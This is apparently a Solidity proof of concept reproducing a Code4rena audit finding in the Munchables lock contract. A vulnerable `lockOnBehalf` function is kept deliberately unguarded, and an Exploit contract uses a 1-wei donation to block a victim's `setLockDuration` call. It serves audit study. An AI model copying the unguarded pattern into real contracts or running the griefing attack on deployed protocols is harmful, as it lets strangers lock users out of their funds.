// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Munchables — [H-01] Malicious user can call `lockOnBehalf` to repeatedly
    extend a user's `unlockTime`, removing their ability to withdraw
    previously locked tokens (Code4rena 2024-05-munchables, reporter 3,
    finding #33594).

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: `lockOnBehalf` lets ANY caller donate tokens "on behalf of"
    an arbitrary recipient -- with NO access control and NO minimum
    `_quantity` -- and unconditionally resets the RECEIVER's
    `lockedToken.unlockTime`. Because a single-block, cheatcode-free
    reduction cannot demonstrate the "wait 5 hours, grief again" variant
    directly, this PoC reproduces the report's OWN second attack vector
    verbatim: a malicious 1-wei `lockOnBehalf` donation blocks the victim's
    unrelated attempt to LOWER her preferred lock duration via
    `setLockDuration`, purely because of an unconsented donation she never
    asked for. Both vectors share the exact same root cause and the exact
    same blamed line.

    The blamed line is copied verbatim from the report (marked `@> VULN`):
      * `lockedToken.unlockTime = uint32(block.timestamp) + uint32(_lockDuration);`
      * the `setLockDuration` guard: `if (... < lockedTokens[...].unlockTime) revert ...`
//////////////////////////////////////////////////////////////////////////*/

contract LockManager {
    struct LockedToken {
        uint256 quantity;
        uint32 unlockTime;
        uint32 lockDuration;
    }

    uint32 public constant DEFAULT_LOCK_DURATION = 30 days; // stands in for the protocol's lockdrop.minDuration

    mapping(address => mapping(address => LockedToken)) public lockedTokens; // user => tokenContract => LockedToken

    /// @notice A user locks their own tokens (native ETH, tokenContract == address(0), for simplicity).
    function lock(address tokenContract, uint256 quantity) external payable {
        LockedToken storage lockedToken = lockedTokens[msg.sender][tokenContract];
        lockedToken.quantity += quantity;
        uint32 _lockDuration = lockedToken.lockDuration == 0 ? DEFAULT_LOCK_DURATION : lockedToken.lockDuration;
        lockedToken.lockDuration = _lockDuration;
        lockedToken.unlockTime = uint32(block.timestamp) + uint32(_lockDuration);
    }

    /// @notice Donate tokens "on behalf of" an arbitrary recipient. Verbatim
    ///         reduction of the report's blamed line: no access control, no
    ///         minimum quantity, and it unconditionally resets the
    ///         RECEIVER's unlockTime -- not the caller's.
    function lockOnBehalf(address tokenContract, uint256 quantity, address onBehalfOf) external payable {
        LockedToken storage lockedToken = lockedTokens[onBehalfOf][tokenContract];
        lockedToken.quantity += quantity;
        uint32 _lockDuration = lockedToken.lockDuration == 0 ? DEFAULT_LOCK_DURATION : lockedToken.lockDuration;
        lockedToken.lockDuration = _lockDuration;
        // @> VULN: resets the RECEIVER's unlockTime. Callable by ANY address,
        // for ANY other address, with `quantity` as low as 0 -- the caller
        // gives up nothing to grief the recipient.
        lockedToken.unlockTime = uint32(block.timestamp) + uint32(_lockDuration);
    }

    /// @notice A user tries to lower their preferred future lock duration.
    function setLockDuration(uint32 _duration) external {
        LockedToken storage lockedToken = lockedTokens[msg.sender][address(0)];
        // @> VULN (companion, verbatim from the report): this check reads
        // `unlockTime`, which `lockOnBehalf` can set to an arbitrary future
        // value on ANYONE's behalf -- so an unconsented donation from a
        // stranger can permanently block the victim from ever lowering their
        // own preferred lock duration.
        if (uint32(block.timestamp) + _duration < lockedToken.unlockTime) {
            revert("LockDurationReducedError");
        }
        lockedToken.lockDuration = _duration;
    }

    function withdraw(address tokenContract, uint256 quantity) external {
        LockedToken storage lockedToken = lockedTokens[msg.sender][tokenContract];
        require(block.timestamp >= lockedToken.unlockTime, "still locked");
        lockedToken.quantity -= quantity;
    }
}

contract Exploit {
    LockManager public lm;
    AliceRelay public aliceRelay;
    address public alice;

    constructor() {
        lm = new LockManager();
        aliceRelay = new AliceRelay(lm);
        alice = address(aliceRelay);
    }

    function run() external {
        // Step 1: Alice has never locked anything yet -- her preferred lock
        // duration slot is untouched (unlockTime == 0, lockDuration == 0).
        (, uint32 unlockTimeBefore, uint32 durationBefore) = lm.lockedTokens(alice, address(0));
        require(unlockTimeBefore == 0 && durationBefore == 0, "alice starts with a clean slate");

        // Control: with a clean slate, Alice CAN freely set a short preferred
        // lock duration (e.g. 1 hour) -- nothing blocks her yet.
        (bool controlOk, ) = aliceRelay.relay(abi.encodeWithSelector(LockManager.setLockDuration.selector, uint32(1 hours)));
        require(controlOk, "control: alice can set a short duration before any donation");

        // Reset alice's duration back to 0 so the next scenario starts clean
        // (mirrors the report's independent-test framing: this is a FRESH
        // demonstration of the grief, not a continuation of the control).
        aliceRelay.relay(abi.encodeWithSelector(LockManager.setLockDuration.selector, uint32(0)));

        // Step 2: this contract (the attacker) makes a 1-wei-quantity
        // donation "on behalf of" Alice -- she never asked for it and the
        // attacker gives up nothing of real value, but her unlockTime is
        // pushed 30 days into the future.
        lm.lockOnBehalf(address(0), 1, alice);
        (, uint32 unlockTimeAfterGrief, ) = lm.lockedTokens(alice, address(0));
        require(unlockTimeAfterGrief > 0, "alice's unlockTime was set by a stranger's unconsented donation");

        // Step 3: Alice now tries to lower her preferred lock duration to 1
        // hour, exactly as in the control above -- but this time it fails.
        (bool ok, ) = aliceRelay.relay(abi.encodeWithSelector(LockManager.setLockDuration.selector, uint32(1 hours)));

        // HARM: a stranger's unconsented, near-zero-cost donation permanently
        // blocks Alice from lowering her own preferred lock duration, purely
        // because `lockOnBehalf` reset a piece of HER state that only SHE
        // should control.
        require(!ok, "harm: alice's setLockDuration is griefed by a stranger's unconsented donation");
    }
}

/// @dev A tiny relay deployed at a fixed, predictable address so its calls to
///      LockManager originate from a distinct "Alice" identity -- standing in
///      for a real externally-owned account, without needing `vm.prank`.
contract AliceRelay {
    LockManager public lm;

    constructor(LockManager _lm) {
        lm = _lm;
    }

    function relay(bytes memory data) external returns (bool, bytes memory) {
        return address(lm).call(data);
    }
}
